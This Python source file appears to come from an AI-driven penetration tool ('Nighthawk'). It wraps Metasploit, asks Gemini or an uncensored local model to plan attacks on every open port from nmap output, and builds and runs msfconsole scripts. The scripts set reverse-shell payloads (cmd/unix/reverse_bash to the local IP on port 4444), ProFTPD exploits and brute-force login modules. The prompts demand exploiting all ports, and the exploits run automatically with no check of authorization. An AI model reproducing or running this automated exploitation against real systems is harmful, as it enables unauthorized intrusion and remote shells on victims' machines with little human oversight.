import re
import subprocess
import tempfile
import os
import socket
import time
from typing import Dict, Optional
from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from .base_tool import BaseTool

console = Console()

class MetasploitTool(BaseTool):
    def __init__(self):
        super().__init__(name="Metasploit Framework", command="msfconsole")
        self.description = "Find and run exploits using Metasploit Framework"
        self._progress_callback = None
    
    def set_progress_callback(self, callback):
        self._progress_callback = callback
    
    def get_local_ip(self, silent: bool = False) -> str:
        try:
            result = self.run_command("ip addr show | grep 'inet ' | grep -v 127.0.0.1 | awk '{print $2}' | cut -d/ -f1 | head -1", silent=silent)
            if result['success'] and result['stdout'].strip():
                return result['stdout'].strip()
            
            result = self.run_command("hostname -I | awk '{print $1}'", silent=silent)
            if result['success'] and result['stdout'].strip():
                return result['stdout'].strip()
            
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception as e:
            console.print(f"[yellow]Warning: Could not detect local IP, using 127.0.0.1[/yellow]")
            return "127.0.0.1"
    
    def validate_ports(self, commands: list, scan_context: Optional[Dict] = None) -> list:
        if not scan_context or 'open_ports' not in scan_context:
            return commands
        
        valid_ports = set()
        for port in scan_context.get('open_ports', []):
            port_num = port.get('port')
            if port_num:
                valid_ports.add(str(port_num))
        
        if not valid_ports:
            return commands
        
        validated_commands = []
        skip_until_next_use = False
        
        for cmd in commands:
            if cmd.strip().lower().startswith('set rport '):
                port_value = cmd.split()[-1].strip()
                if port_value not in valid_ports:
                    console.print(f"[yellow]⚠ Skipping exploit for port {port_value} (not in scan results)[/yellow]")
                    skip_until_next_use = True
                    continue
                else:
                    skip_until_next_use = False
            
            if skip_until_next_use:
                if cmd.strip().lower().startswith('use ') or cmd.strip().lower().startswith('search '):
                    skip_until_next_use = False
                else:
                    continue
            
            validated_commands.append(cmd)
        
        if len(validated_commands) < len(commands):
            console.print(f"[cyan]ℹ Filtered {len(commands) - len(validated_commands)} commands targeting invalid ports[/cyan]")
        
        return validated_commands
    
    def check_installed(self) -> bool:
        result = self.run_command("which msfconsole")
        if result['success']:
            version_result = self.run_command("msfconsole --version")
            if version_result['success']:
                version_line = version_result['stdout'].strip().split('\n')[0]
                console.print(f"✓ {version_line} detected", style="green")
            return True
        return False
    
    def search_msf_modules(self, service: str, version: str = "", silent: bool = False) -> list:
        search_query = f"{service} {version}".strip()
        cmd = f'msfconsole -q -x "search {search_query}; exit" 2>/dev/null'
        
        if not silent:
            with Progress(
                SpinnerColumn(),
                TextColumn("[cyan]{task.description}"),
                transient=True
            ) as progress:
                task = progress.add_task(f"Searching Metasploit database for {service} modules...", total=None)
                result = self.run_command(cmd, timeout=30, silent=False)
                progress.update(task, completed=True)
        else:
            result = self.run_command(cmd, timeout=30, silent=True)
        
        if result['success'] and result['stdout']:
            modules = []
            for line in result['stdout'].split('\n'):
                if 'exploit/' in line or 'auxiliary/' in line:
                    parts = line.split()
                    for part in parts:
                        if '/' in part and (part.startswith('exploit/') or part.startswith('auxiliary/')):
                            clean_part = re.sub(r'\x1b\[[0-9;]+m', '', part)
                            modules.append(clean_part.strip())
                            break
            
            if not silent:
                if modules:
                    console.print(f"[green]✓ Found {len(modules)} module(s) for {service}[/green]")
                    for mod in modules[:3]:  # Show first 3
                        console.print(f"  • {mod}", style="dim")
                else:
                    console.print(f"[yellow]⚠ No specific modules found for {service}[/yellow]")
            
            return modules
        
        return []
    
    def validate_module(self, module_path: str, silent: bool = False) -> bool:
        clean_module = re.sub(r'\x1b\[[0-9;]+m', '', module_path)
        cmd = f'msfconsole -q -x "use {clean_module}; exit" 2>&1'
        result = self.run_command(cmd, timeout=15, silent=silent)
        
        if result['success']:
            output = result['stdout'].lower()
            if 'failed to load' in output or 'no results from search' in output:
                return False
            return True
        return False
    
    def get_module_payloads(self, module_path: str, silent: bool = False) -> list:
        clean_module = re.sub(r'\x1b\[[0-9;]+m', '', module_path)
        cmd = f'msfconsole -q -x "use {clean_module}; show payloads; exit" 2>/dev/null'
        
        if not silent:
            with Progress(
                SpinnerColumn(),
                TextColumn("[cyan]{task.description}"),
                transient=True
            ) as progress:
                task = progress.add_task(f"Checking compatible payloads for {clean_module}...", total=None)
                result = self.run_command(cmd, timeout=20, silent=False)
                progress.update(task, completed=True)
        else:
            result = self.run_command(cmd, timeout=20, silent=True)
        
        payloads = []
        if result['success'] and result['stdout']:
            for line in result['stdout'].split('\n'):
                line = line.strip()
                if line.startswith('cmd/') or line.startswith('generic/') or line.startswith('linux/'):
                    parts = line.split()
                    if parts:
                        payloads.append(parts[0])
        
        if not silent and payloads:
            console.print(f"[green]✓ Found {len(payloads)} compatible payload(s)[/green]")
            for p in payloads[:3]:
                console.print(f"  • {p}", style="dim")
        
        return payloads
    
    def generate_command(self, user_request: str, ai_response: str = None) -> str:
        console.print("\n[bold cyan]🤖 AI is analyzing scan results and planning exploitation...[/bold cyan]")
        
        scan_context = getattr(self, '_scan_context', None)
        
        # Get AI to decide which ports and services to target
        plan_prompt = self.get_planning_prompt(user_request, scan_context)
        
        try:
            plan = None
            ai_used = None
            
            try:
                import google.generativeai as genai
                import os
                from dotenv import load_dotenv
                
                load_dotenv()
                api_key = os.getenv('GOOGLE_API_KEY')
                
                if api_key:
                    try:
                        with Progress(
                            SpinnerColumn(),
                            TextColumn("[cyan]{task.description}"),
                            transient=True
                        ) as progress:
                            task = progress.add_task("💭 AI (Gemini 2.5 Pro) is selecting target ports and services...", total=None)
                            
                            genai.configure(api_key=api_key)
                            model = genai.GenerativeModel('gemini-2.5-pro')
                            
                            response = model.generate_content(f"{plan_prompt}\n\nUser request: {user_request}")
                            plan = response.text
                            ai_used = "Google Gemini 2.5 Pro"
                            progress.update(task, completed=True)
                    except Exception as gemini_pro_error:
                        console.print(f"[yellow]⚠ Gemini 2.5 Pro failed: {str(gemini_pro_error)}[/yellow]")
                        console.print(f"[dim]Trying Gemini 2.5 Flash...[/dim]")
                        
                        try:
                            with Progress(
                                SpinnerColumn(),
                                TextColumn("[cyan]{task.description}"),
                                transient=True
                            ) as progress:
                                task = progress.add_task("💭 AI (Gemini 2.5 Flash) is selecting target ports and services...", total=None)
                                
                                genai.configure(api_key=api_key)
                                model = genai.GenerativeModel('gemini-2.5-flash')
                                
                                response = model.generate_content(f"{plan_prompt}\n\nUser request: {user_request}")
                                plan = response.text
                                ai_used = "Google Gemini 2.5 Flash"
                                progress.update(task, completed=True)
                        except Exception as gemini_flash_error:
                            console.print(f"[yellow]⚠ Gemini 2.5 Flash failed: {str(gemini_flash_error)}[/yellow]")
                            console.print(f"[dim]Falling back to Ollama...[/dim]")
                            plan = None
                else:
                    console.print(f"[dim]No GOOGLE_API_KEY found, using Ollama...[/dim]")
            except ImportError:
                console.print(f"[dim]Gemini library not available, using Ollama...[/dim]")
            
            if not plan:
                import ollama
                
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[cyan]{task.description}"),
                    transient=True
                ) as progress:
                    task = progress.add_task("💭 AI (Ollama) is selecting target ports and services...", total=None)
                    
                    plan_response = ollama.chat(model='dolphin-llama3:8b', messages=[
                        {
                            'role': 'system',
                            'content': plan_prompt
                        },
                        {
                            'role': 'user',
                            'content': user_request
                        }
                    ])
                    plan = plan_response['message']['content']
                    ai_used = "Ollama dolphin-llama3:8b"
                    progress.update(task, completed=True)
            
            console.print(f"\n[dim]🤖 Using: {ai_used}[/dim]")
            console.print(f"\n[yellow]📋 AI Exploitation Plan:[/yellow]")
            console.print(Panel(plan, border_style="dim", padding=(1, 2)))
            
            # Extract services to target from plan
            console.print("\n[cyan]🔄 Parsing exploitation plan...[/cyan]")
            services_to_exploit = self.parse_exploitation_plan(plan, scan_context)
            
            if not services_to_exploit:
                console.print("[yellow]⚠️ AI response couldn't be parsed, using fallback...[/yellow]")
                if scan_context and 'open_ports' in scan_context:
                    console.print("[cyan]Using all services from scan results as targets[/cyan]")
                    for port_info in scan_context['open_ports']:
                        services_to_exploit.append({
                            'port': port_info.get('port', ''),
                            'service': port_info.get('service', 'unknown'),
                            'version': port_info.get('version', ''),
                            'attack_type': 'exploit',
                            'reason': 'Automatic targeting (AI parsing failed)'
                        })
                
                if not services_to_exploit:
                    console.print("[red]❌ No services available for exploitation[/red]")
                    console.print("[dim]Tip: Run an nmap scan first to gather target information[/dim]")
                    return []
            
            console.print(f"\n[bold green]✓ Identified {len(services_to_exploit)} target(s) for exploitation[/bold green]\n")
            
            all_commands = []
            
            for i, service_info in enumerate(services_to_exploit, 1):
                progress_percent = int((i / len(services_to_exploit)) * 100)
                
                if self._progress_callback:
                    self._progress_callback(
                        current=i,
                        total=len(services_to_exploit),
                        message=f"Processing {service_info['service']}:{service_info['port']}"
                    )
                else:
                    filled = int((i / len(services_to_exploit)) * 40)
                    empty = 40 - filled
                    bar = f"\033[92m{'█' * filled}\033[90m{'░' * empty}\033[0m"
                    
                    import sys
                    sys.stdout.write(f"\r[{bar}] {progress_percent}% \033[96m({i}/{len(services_to_exploit)}) {service_info['service']}:{service_info['port']}\033[0m")
                    sys.stdout.flush()
                
                modules = self.search_msf_modules(service_info['service'], service_info.get('version', ''), silent=True)
                
                if not modules:
                    modules = self.get_auxiliary_modules(service_info['service'], service_info['port'])
                
                sys.stdout.write('\r\033[K')
                sys.stdout.flush()
                
                if modules:
                    module = modules[0]
                    
                    if self.validate_module(module, silent=True):
                        commands = self.build_commands_for_module(
                            module, 
                            service_info, 
                            scan_context,
                            silent=True
                        )
                        all_commands.extend(commands)
                        console.print(f"[green]✓ [{i}/{len(services_to_exploit)}] {service_info['service']}:{service_info['port']} - {module} - {len(commands)} commands[/green]")
                    else:
                        console.print(f"[yellow]⚠ [{i}/{len(services_to_exploit)}] {service_info['service']}:{service_info['port']} - Module validation failed[/yellow]")
                else:
                    console.print(f"[dim]✗ [{i}/{len(services_to_exploit)}] {service_info['service']}:{service_info['port']} - No exploits available[/dim]")
            
            console.print("\n[bold cyan]📊 Exploitation Summary:[/bold cyan]")
            if all_commands:
                console.print(f"[bold green]✅ Successfully generated {len(all_commands)} validated commands![/bold green]\n")
                console.print(f"[cyan]📝 Final command list:[/cyan]")
                for idx, cmd in enumerate(all_commands, 1):
                    console.print(f"  {idx}. [yellow]{cmd}[/yellow]")
                return all_commands
            else:
                console.print("[red]❌ No valid commands could be generated[/red]")
                return []
                
        except Exception as e:
            console.print(f"[red]❌ Error generating command: {e}[/red]")
            import traceback
            console.print(f"[dim]{traceback.format_exc()}[/dim]")
            return []
    
    def get_planning_prompt(self, user_request: str, scan_context: Optional[Dict] = None) -> str:
        context_info = ""
        if scan_context and scan_context.get('open_ports'):
            context_info = "=== SCAN RESULTS ===\n"
            for port in scan_context['open_ports']:
                context_info += f"Port {port.get('port')}: {port.get('service')} - {port.get('version', 'unknown version')}\n"
            context_info += "\n"
        
        return f"""{context_info}You are a penetration testing expert analyzing scan results.

CRITICAL: You MUST respond with ONLY the format below, NO OTHER TEXT.

For each open port, output EXACTLY this format (one line per port):
PORT: <number> | SERVICE: <name> | ATTACK: exploit | REASON: <short reason>

DO NOT include explanations, introductions, or any other text.
DO NOT use auxiliary - ONLY use "exploit" for ATTACK type.
DO NOT add markdown, numbering, or bullets.

EXAMPLE OUTPUT:
PORT: 21 | SERVICE: ftp | ATTACK: exploit | REASON: ProFTPD backdoor
PORT: 22 | SERVICE: ssh | ATTACK: exploit | REASON: Brute force authentication
PORT: 80 | SERVICE: http | ATTACK: exploit | REASON: Apache path traversal
PORT: 3306 | SERVICE: mysql | ATTACK: exploit | REASON: Database credential attack

NOW OUTPUT FOR ALL {len(scan_context.get('open_ports', [])) if scan_context else 0} PORTS FOUND:"""
    
    def parse_exploitation_plan(self, plan: str, scan_context: Optional[Dict] = None) -> list:
        services = []
        
        for line in plan.split('\n'):
            line = line.strip()
            
            if not line or line.startswith('Based on') or line.startswith('Here'):
                continue
            
            if 'PORT:' in line and 'SERVICE:' in line:
                try:
                    port_match = re.search(r'PORT:\s*(\d+)', line, re.IGNORECASE)
                    service_match = re.search(r'SERVICE:\s*([a-zA-Z0-9_/-]+)', line, re.IGNORECASE)
                    attack_match = re.search(r'ATTACK:\s*(exploit|auxiliary)', line, re.IGNORECASE)
                    
                    if port_match and service_match:
                        port = port_match.group(1)
                        service = service_match.group(1).lower()
                        attack_type = attack_match.group(1).lower() if attack_match else 'auxiliary'
                        
                        version = ""
                        if scan_context and scan_context.get('open_ports'):
                            for p in scan_context['open_ports']:
                                if str(p.get('port')) == str(port):
                                    version = p.get('version', '')
                                    service = p.get('service', service)
                                    break
                        
                        services.append({
                            'port': port,
                            'service': service,
                            'attack_type': attack_type,
                            'version': version
                        })
                        console.print(f"[green]✓ Queued: {service} on port {port} ({attack_type})[/green]")
                except Exception as e:
                    console.print(f"[dim]⚠ Could not parse: {line[:80]}...[/dim]")
                    continue
            
            elif re.match(r'^\d+\.\s+PORT:', line, re.IGNORECASE):
                try:
                    port_match = re.search(r'PORT:\s*(\d+)', line, re.IGNORECASE)
                    service_match = re.search(r'SERVICE:\s*([a-zA-Z0-9_/-]+)', line, re.IGNORECASE)
                    attack_match = re.search(r'ATTACK:\s*(exploit|auxiliary)', line, re.IGNORECASE)
                    
                    if port_match and service_match:
                        port = port_match.group(1)
                        service = service_match.group(1).lower()
                        attack_type = attack_match.group(1).lower() if attack_match else 'auxiliary'
                        
                        version = ""
                        if scan_context and scan_context.get('open_ports'):
                            for p in scan_context['open_ports']:
                                if str(p.get('port')) == str(port):
                                    version = p.get('version', '')
                                    service = p.get('service', service)
                                    break
                        
                        services.append({
                            'port': port,
                            'service': service,
                            'attack_type': attack_type,
                            'version': version
                        })
                        console.print(f"[green]✓ Queued: {service} on port {port} ({attack_type})[/green]")
                except Exception as e:
                    continue
        
        if not services:
            console.print("[yellow]⚠ No services parsed from plan, trying fallback extraction...[/yellow]")
            if scan_context and scan_context.get('open_ports'):
                for port_info in scan_context['open_ports']:
                    services.append({
                        'port': str(port_info['port']),
                        'service': port_info.get('service', 'unknown'),
                        'attack_type': 'auxiliary',
                        'version': port_info.get('version', '')
                    })
                    console.print(f"[cyan]→ Auto-queued: {port_info.get('service')} on port {port_info['port']}[/cyan]")
        
        return services
    
    def get_auxiliary_modules(self, service: str, port: str) -> list:
        auxiliary_map = {
            'ftp': ['auxiliary/scanner/ftp/ftp_version', 'auxiliary/scanner/ftp/ftp_login'],
            'ssh': ['auxiliary/scanner/ssh/ssh_version', 'auxiliary/scanner/ssh/ssh_login'],
            'smtp': ['auxiliary/scanner/smtp/smtp_version', 'auxiliary/scanner/smtp/smtp_enum'],
            'pop3': ['auxiliary/scanner/pop3/pop3_version', 'auxiliary/scanner/pop3/pop3_login'],
            'imap': ['auxiliary/scanner/imap/imap_version'],
            'mysql': ['auxiliary/scanner/mysql/mysql_version', 'auxiliary/scanner/mysql/mysql_login'],
            'http': ['auxiliary/scanner/http/http_version', 'auxiliary/scanner/http/http_header'],
            'https': ['auxiliary/scanner/http/http_version', 'auxiliary/scanner/http/http_header'],
            'telnet': ['auxiliary/scanner/telnet/telnet_version', 'auxiliary/scanner/telnet/telnet_login'],
            'dns': ['auxiliary/scanner/dns/dns_amp'],
            'rpcbind': ['auxiliary/scanner/misc/sunrpc_portmapper']
        }
        
        service_lower = service.lower()
        if service_lower in auxiliary_map:
            return auxiliary_map[service_lower]
        
        return []
    
    def build_commands_for_module(self, module: str, service_info: dict, scan_context: Optional[Dict] = None, silent: bool = False) -> list:
        commands = []
        local_ip = self.get_local_ip(silent=silent)
        target_host = scan_context.get('ip') or scan_context.get('target', 'TARGET') if scan_context else 'TARGET'
        
        clean_module = re.sub(r'\x1b\[[0-9;]+m', '', module)
        
        if not silent:
            console.print(f"[cyan]🔨 Building commands for {clean_module}...[/cyan]")
        
        commands.append(f"use {clean_module}")
        commands.append(f"set RHOSTS {target_host}")
        commands.append(f"set RPORT {service_info['port']}")
        
        if clean_module.startswith('exploit/'):
            payloads = self.get_module_payloads(clean_module, silent=silent)
            
            if payloads:
                payload = payloads[0]
                if not silent:
                    console.print(f"[green]✓ Using payload: {payload}[/green]")
                commands.append(f"set PAYLOAD {payload}")
                commands.append(f"set LHOST {local_ip}")
                commands.append(f"set LPORT 4444")
            elif not silent:
                console.print(f"[yellow]⚠ No payloads found, module may not need one[/yellow]")
            
            commands.append("exploit")
        else:
            if not silent:
                console.print(f"[green]✓ Auxiliary module, no payload needed[/green]")
            commands.append("run")
        
        return commands
    
    def get_ai_prompt(self, user_request: str, scan_context: Optional[Dict] = None) -> str:
        if scan_context and not isinstance(scan_context, dict):
            console.print(f"[yellow]Warning: scan_context is not a dict, ignoring[/yellow]")
            scan_context = None
        
        local_ip = self.get_local_ip(silent=True)
        
        context_info = ""
        target_host = "TARGET"
        all_ports_info = ""
        
        if scan_context:
            context_info = "\n\n=== PREVIOUS SCAN DATA ===\n"
            
            if 'target' in scan_context:
                context_info += f"Target: {scan_context['target']}\n"
                target_host = scan_context['target']
            
            if 'ip' in scan_context:
                context_info += f"IP Address: {scan_context['ip']}\n"
                target_host = scan_context['ip']
            
            if 'open_ports' in scan_context and scan_context['open_ports']:
                context_info += f"\nOpen Ports Found:\n"
                ports_list = []
                for port in scan_context['open_ports']:
                    port_num = port.get('port', 'unknown')
                    service = port.get('service', 'unknown')
                    version = port.get('version', 'no version detected')
                    context_info += f"  - Port {port_num}: {service} ({version})\n"
                    ports_list.append({
                        'port': port_num,
                        'service': service,
                        'version': version
                    })
                
                if ports_list:
                    all_ports_info = "\n\n=== AVAILABLE PORTS FOR EXPLOITATION ===\n"
                    all_ports_info += "You should attempt to exploit ALL relevant vulnerable ports below:\n"
                    for p in ports_list:
                        all_ports_info += f"\n• Port {p['port']} ({p['service']}): {p['version']}\n"
                        all_ports_info += f"  → Use: set RPORT {p['port']}\n"
                    all_ports_info += "\nGenerate separate exploit commands for EACH exploitable port.\n"
            
            if 'os' in scan_context:
                context_info += f"\nOperating System: {scan_context['os']}\n"
            
            context_info += "\n=== END SCAN DATA ===\n"
        
        prompt = f"""You are a Metasploit penetration testing expert performing authorized security testing.

{context_info}{all_ports_info}

YOUR MISSION: Generate EXECUTABLE msfconsole commands to exploit ALL relevant ports from the scan.

CRITICAL FORMAT RULES:
1. Output ONLY raw msfconsole commands, one per line
2. NO explanations, NO descriptions, NO markdown, NO numbering
3. NO sentences like "Searching for..." or "Scanning for..."
4. ONLY actual commands that msfconsole can execute
5. Use EXACTLY "{target_host}" for RHOSTS - DO NOT modify it
6. ONLY exploit ports listed in the scan data above

CRITICAL PAYLOAD RULES:
- NEVER use spaces in payload names: cmd/unix/reverse_bash NOT cmd/ unix /reverse
- After 'use exploit/...', check available payloads first
- Common valid payloads:
  * cmd/unix/reverse_bash (for Unix/Linux reverse shells)
  * cmd/unix/reverse_netcat (if netcat is available)
  * generic/shell_reverse_tcp (generic reverse shell)
  * cmd/unix/interact (for backdoors without payload)
- Set payload BEFORE setting LHOST/LPORT
- Only set LHOST/LPORT after setting a valid PAYLOAD

REQUIRED WORKFLOW FOR EACH EXPLOIT:
1. Search for exploit: search <service> <version>
2. Select exploit: use exploit/path/to/exploit
3. Set target: set RHOSTS {target_host}
4. Set port: set RPORT <port>
5. Set payload: set PAYLOAD cmd/unix/reverse_bash
6. Set attacker IP: set LHOST {local_ip}
7. Set listener port: set LPORT 4444
8. Run: exploit

MULTI-PORT EXPLOITATION:
You MUST generate exploit attempts for ALL exploitable services:
- FTP (21): ProFTPD exploits (modcopy, backdoor)
- SSH (22): auxiliary/scanner/ssh/ssh_login (NO payload needed)
- SMTP (25,465,587): auxiliary/scanner/smtp/smtp_enum, smtp_version
- HTTP (80,443): Search for Apache exploits, web app vulnerabilities
- POP3 (110,995): auxiliary/scanner/pop3/pop3_login
- IMAP (143,993): auxiliary/scanner/imap/imap_login
- MySQL (3306): auxiliary/scanner/mysql/mysql_login, mysql_version
- DNS (53): auxiliary/scanner/dns/dns_amp

CORRECT EXAMPLE - FTP with ProFTPD:
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS {target_host}
set RPORT 21
set SITEPATH /var/www/html
set PAYLOAD cmd/unix/reverse_bash
set LHOST {local_ip}
set LPORT 4444
exploit

CORRECT EXAMPLE - MySQL enumeration:
use auxiliary/scanner/mysql/mysql_version
set RHOSTS {target_host}
set RPORT 3306
run
use auxiliary/scanner/mysql/mysql_login
set RHOSTS {target_host}
set RPORT 3306
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set STOP_ON_SUCCESS true
run

CORRECT EXAMPLE - Multiple ports:
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS {target_host}
set RPORT 21
set PAYLOAD cmd/unix/reverse_bash
set LHOST {local_ip}
set LPORT 4444
exploit
use auxiliary/scanner/mysql/mysql_login
set RHOSTS {target_host}
set RPORT 3306
run
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS {target_host}
set RPORT 25
run

WRONG EXAMPLE (spaces in payload):
set PAYLOAD cmd/ unix /reverse  ❌ INVALID

CRITICAL REQUIREMENTS:
✓ Exploit ALL ports from scan (not just one)
✓ Use correct payload names (no spaces)
✓ Set RHOSTS {target_host} exactly
✓ Set LHOST {local_ip} for reverse shells
✓ Use auxiliary modules for enumeration (no payload)
✓ Match exploit to exact service version when possible"""

        return prompt
    
    def fix_payload_names(self, commands: list) -> list:
        fixed_commands = []
        
        for cmd in commands:
            if cmd.strip().lower().startswith('set payload '):
                parts = cmd.split(None, 2)
                if len(parts) == 3:
                    payload_value = parts[2].replace(' ', '').replace('/', '/')
                    cmd = f"{parts[0]} {parts[1]} {payload_value}"
                    console.print(f"[cyan]Fixed payload: {cmd}[/cyan]")
            
            fixed_commands.append(cmd)
        
        return fixed_commands
    
    def extract_commands(self, ai_response: str) -> list:
        commands = []
        
        code_block_pattern = r'```(?:bash|shell|console|msfconsole)?\n(.*?)```'
        matches = re.findall(code_block_pattern, ai_response, re.DOTALL)
        
        if matches:
            for block in matches:
                lines = block.strip().split('\n')
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith('#') and not line.startswith('//'):
                        commands.append(line)
        
        if not commands:
            lines = ai_response.split('\n')
            msf_commands = ['search', 'use', 'set', 'show', 'info', 'run', 'exploit', 
                          'check', 'options', 'sessions', 'back', 'exit']
            
            for line in lines:
                line = line.strip()
                
                if not line:
                    continue
                
                skip_patterns = [
                    r'^[-*•]\s*[A-Z]',
                    r'^\d+\.\s+[A-Z]',
                    r'^(Searching|Scanning|Found|Investigating|Trying|Attempting)',
                    r'exploit found|discovered|module',
                ]
                
                should_skip = False
                for pattern in skip_patterns:
                    if re.match(pattern, line):
                        should_skip = True
                        break
                
                if should_skip:
                    continue
                
                line = re.sub(r'^[-*•]\s*', '', line)
                line = re.sub(r'^\d+\.\s*', '', line)
                
                if any(line.startswith(cmd + ' ') or line == cmd for cmd in msf_commands):
                    commands.append(line)
        
        if not commands:
            console.print(f"[yellow]Debug: Could not extract commands from AI response[/yellow]")
            console.print(f"[dim]AI Response preview: {ai_response[:500]}...[/dim]")
        
        return commands
    
    def execute(self, commands: list, use_sudo: bool = False) -> Dict:
        if not commands:
            return {
                'success': False,
                'output': 'No commands to execute',
                'error': 'Empty command list'
            }
        
        console.print(f"\n[cyan]Executing Metasploit commands...[/cyan]")
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as rc_file:
            rc_file.write("# Nighthawk Metasploit Resource Script\n")
            for cmd in commands:
                rc_file.write(f"{cmd}\n")
            rc_file.write("exit\n")
            rc_filename = rc_file.name
        
        try:
            full_command = f"msfconsole -q -r {rc_filename}"
            
            console.print(f"\n[yellow]Running: {full_command}[/yellow]")
            
            result = self.run_command(full_command, timeout=300)
            
            os.unlink(rc_filename)
            
            return result
            
        except Exception as e:
            if os.path.exists(rc_filename):
                os.unlink(rc_filename)
            
            return {
                'success': False,
                'output': '',
                'error': str(e)
            }
    
    def format_output(self, result: Dict, commands: list) -> None:
        if result['success']:
            console.print("\n[green]Metasploit Results:[/green]")
            
            console.print(Panel(
                "\n".join(commands),
                title="[cyan]Commands Executed[/cyan]",
                border_style="cyan"
            ))
            
            output = result['stdout']
            
            if output:
                output_lines = output.split('\n')
                formatted_lines = []
                
                for line in output_lines:
                    if 'exploit' in line.lower() or 'vulnerable' in line.lower():
                        formatted_lines.append(f"[red]{line}[/red]")
                    elif 'success' in line.lower():
                        formatted_lines.append(f"[green]{line}[/green]")
                    elif 'error' in line.lower() or 'fail' in line.lower():
                        formatted_lines.append(f"[yellow]{line}[/yellow]")
                    else:
                        formatted_lines.append(line)
                
                console.print(Panel(
                    "\n".join(formatted_lines),
                    title="[green]Metasploit Output[/green]",
                    border_style="green"
                ))
            
            exploit_pattern = r'exploit/[a-z0-9_/]+'
            exploits = re.findall(exploit_pattern, output)
            if exploits:
                console.print("\n[yellow]Found Exploits:[/yellow]")
                for exploit in set(exploits):
                    console.print(f"  • {exploit}", style="red bold")
        else:
            console.print(f"\n[red]Metasploit execution failed:[/red]")
            console.print(result.get('error', 'Unknown error'))

    def parse_scan_data(self, raw_output: str) -> Dict:
        scan_data = {
            'open_ports': [],
            'services': [],
            'os': None
        }
        
        port_pattern = r'(\d+)/tcp\s+open\s+(\S+)\s*(.*)?'
        matches = re.findall(port_pattern, raw_output)
        
        for match in matches:
            port_info = {
                'port': match[0],
                'service': match[1],
                'version': match[2].strip() if len(match) > 2 else ''
            }
            scan_data['open_ports'].append(port_info)
            scan_data['services'].append(match[1])
        
        os_pattern = r'OS details?: (.+)'
        os_match = re.search(os_pattern, raw_output)
        if os_match:
            scan_data['os'] = os_match.group(1).strip()
        
        ip_pattern = r'Nmap scan report for .*?\(([0-9.]+)\)'
        ip_match = re.search(ip_pattern, raw_output)
        if ip_match:
            scan_data['ip'] = ip_match.group(1)
        
        return scan_data
